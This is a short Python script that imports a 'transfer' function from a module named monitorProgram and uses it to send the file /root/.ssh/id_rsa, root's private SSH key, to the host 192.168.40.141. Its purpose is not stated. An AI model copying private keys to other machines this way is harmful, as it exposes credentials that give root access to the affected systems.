from monitorProgram import transfer

host = ['192.168.40.141']

for ip in host:
    transfer('/root/.ssh/id_rsa',ip)